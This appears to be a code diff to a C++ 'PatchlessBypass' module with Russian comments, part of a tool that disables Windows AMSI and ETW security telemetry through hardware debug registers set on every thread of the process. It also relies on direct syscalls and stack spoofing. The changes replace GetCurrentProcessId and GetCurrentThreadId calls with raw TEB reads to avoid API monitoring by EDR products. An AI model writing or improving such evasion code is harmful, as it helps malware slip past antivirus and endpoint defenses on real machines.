@@ -11,6 +11,7 @@
 #include "PatchlessBypass.h"
 #include "ApiResolver.h"
 #include "Syscall.h"
+#include <intrin.h>
 #include "StackSpoof.h"
 
 namespace PatchlessBypass
@@ -171,7 +172,7 @@ namespace PatchlessBypass
         } objAttr = { sizeof(_OBJ_ATTR), nullptr, nullptr, 0, nullptr, nullptr };
 
         CLIENT_ID cid = {};
-        cid.UniqueProcess = (HANDLE)(ULONG_PTR)GetCurrentProcessId();
+        cid.UniqueProcess = (HANDLE)(ULONG_PTR)(DWORD)(ULONG_PTR)__readgsqword(0x40);
         cid.UniqueThread  = (HANDLE)(ULONG_PTR)tid;
 
         HANDLE hThread = nullptr;
@@ -225,7 +226,7 @@ namespace PatchlessBypass
         } objAttr = { sizeof(_OBJ_ATTR), nullptr, nullptr, 0, nullptr, nullptr };
 
         CLIENT_ID cid = {};
-        cid.UniqueProcess = (HANDLE)(ULONG_PTR)GetCurrentProcessId();
+        cid.UniqueProcess = (HANDLE)(ULONG_PTR)(DWORD)(ULONG_PTR)__readgsqword(0x40);
         cid.UniqueThread  = (HANDLE)(ULONG_PTR)tid;
 
         HANDLE hThread = nullptr;
@@ -349,17 +350,17 @@ namespace PatchlessBypass
         // DR-регистры пер-потоковые — EDR callback потоки тоже должны быть защищены
 
         // Сначала устанавливаем на текущий поток (всегда доступен)
-        if (!SetDrOnThread(GetCurrentThreadId(), s_AmsiAddr, s_EtwAddr, s_EtwExAddr))
+        if (!SetDrOnThread((DWORD)(ULONG_PTR)__readgsqword(0x48), s_AmsiAddr, s_EtwAddr, s_EtwExAddr))
             return false;
 
         // Перечисляем все потоки процесса и устанавливаем DR на каждый
         s_ThreadCount = 0;
-        EnumerateProcessThreads(GetCurrentProcessId(), s_ThreadIds, &s_ThreadCount, 256);
+        EnumerateProcessThreads((DWORD)(ULONG_PTR)__readgsqword(0x40), s_ThreadIds, &s_ThreadCount, 256);
 
         for (DWORD i = 0; i < s_ThreadCount; i++)
         {
             // Текущий поток уже обработан выше
-            if (s_ThreadIds[i] == GetCurrentThreadId()) continue;
+            if (s_ThreadIds[i] == (DWORD)(ULONG_PTR)__readgsqword(0x48)) continue;
             SetDrOnThread(s_ThreadIds[i], s_AmsiAddr, s_EtwAddr, s_EtwExAddr);
         }
 
@@ -373,12 +374,12 @@ namespace PatchlessBypass
         if (!s_Active) return;
 
         // Очищаем на текущем потоке
-        ClearDrOnThread(GetCurrentThreadId());
+        ClearDrOnThread((DWORD)(ULONG_PTR)__readgsqword(0x48));
 
         // Очищаем на всех остальных потоках
         for (DWORD i = 0; i < s_ThreadCount; i++)
         {
-            if (s_ThreadIds[i] == GetCurrentThreadId()) continue;
+            if (s_ThreadIds[i] == (DWORD)(ULONG_PTR)__readgsqword(0x48)) continue;
             ClearDrOnThread(s_ThreadIds[i]);
         }
 
